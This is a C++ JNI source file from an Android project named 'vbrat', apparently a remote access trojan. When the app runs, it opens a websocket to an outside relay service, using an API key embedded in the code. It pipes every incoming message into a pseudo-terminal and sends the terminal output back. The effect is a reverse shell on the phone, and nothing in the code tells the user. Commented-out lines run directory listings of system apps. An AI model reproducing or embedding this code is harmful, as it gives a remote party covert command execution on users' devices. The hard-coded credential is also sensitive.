#include <jni.h>
#include <string>
#include <ctype.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <pthread.h>

#include "handlepty.h"
#include "common.h"
#include "tiny_websockets_lib/include/tiny_websockets/client.hpp"
#include "tiny_websockets_lib/include/tiny_websockets/message.hpp"
#include "tiny_websockets_lib/include/tiny_websockets/internals/ws_common.hpp"
#include <tiny_websockets/client.hpp>
#include <tiny_websockets/server.hpp>

using namespace websockets;

int erre;
int supererr = 0;
enum state {
    S_ERROR = 0,
    S_INIT = 1,
    S_CONNECTING = 2,
    S_CONNECTED = 3,
    S_DISCONNECTED = 4,
    S_RECONNECTION = 5
};

pthread_mutex_t stateLock;
unsigned state = S_INIT;
WebsocketsClient client;

void stateChange(unsigned newState) {
    pthread_mutex_lock(&stateLock);
    {
        state = newState;
    }
    pthread_mutex_unlock(&stateLock);
}


void onMessageCallback(WebsocketsMessage message) {
    char risp[4096];
    ttySend(message.data().c_str());
    //execCommand(message.data().c_str(), risp, 4096);
    //client.send(risp);

}
static void ttyread(char *msg)
{
    client.send(msg);
}

void onEventsCallback(WebsocketsEvent event, std::string data) {
    if (event == WebsocketsEvent::ConnectionOpened) {
        printf("Connnection Opened");
        startTTY(ttyread);
    } else if (event == WebsocketsEvent::ConnectionClosed) {
        printf("Connnection Closed");
    }
}


extern "C" JNIEXPORT jstring JNICALL
Java_com_example_vbrat_MainActivity_stringFromJNI(JNIEnv *env, jobject, int what) {
    /*
    char risp[2048];
    execCommand("ls /system/app", risp, 2048);
    execCommand("cd /system/app", risp, 2048);
    execCommand("ls", risp, 2048);
    execCommand("pwd", risp, 2048);
*/

    switch (state) // /data/data/com.example.vbrat/lib/libnative-lib.so
    {
        case S_INIT:
            //FILE *pp = fopen("/data/data/com.example.vbrat/lib/libnative-lib.so", "")

            client.onMessage(onMessageCallback);
            client.onEvent(onEventsCallback);
            //client.connect("wss://echo.websocket.org/");
            client.connect(
                    "wss://connect.websocket.in/v3/69?apiKey=l7d6CdYNyjLFsRA0uzyFD6Ec0pcPkhKFlYVNwJPeWgTmAIFhZoeM9U5LO3Zi");
            if (pthread_mutex_init(&stateLock, NULL) != 0) {
                //last_err.str = "MUTEX INIT ERR";
                state = S_ERROR;
                return env->NewStringUTF("MUTEX INIT ERR");
            }

            stateChange(S_CONNECTING);
            return env->NewStringUTF("INIT RUN");
            break;
        case S_CONNECTING:
            if (client.available())
                stateChange(S_CONNECTED);
            return env->NewStringUTF("CONNECTING...");
            break;
        case S_CONNECTED:
            if (client.available())
                client.poll();
            else
                stateChange(S_DISCONNECTED);
            return env->NewStringUTF("CONNECTED...");
            break;
        case S_RECONNECTION:
            if (client.available())
                stateChange(S_CONNECTED);
            return env->NewStringUTF("RECONNECTING...");
            break;
        case S_DISCONNECTED:
            //client.connect("wss://connect.websocket.in/v3/69?apiKey=l7d6CdYNyjLFsRA0uzyFD6Ec0pcPkhKFlYVNwJPeWgTmAIFhZoeM9U5LO3Zi");
            stateChange(S_RECONNECTION);
            return env->NewStringUTF("DISCONNECTED...");
            break;
        case S_ERROR:
            //wstest.wsclient->shutdown(wstest.wsclient);
            return env->NewStringUTF("errr");
            break;
    }

}
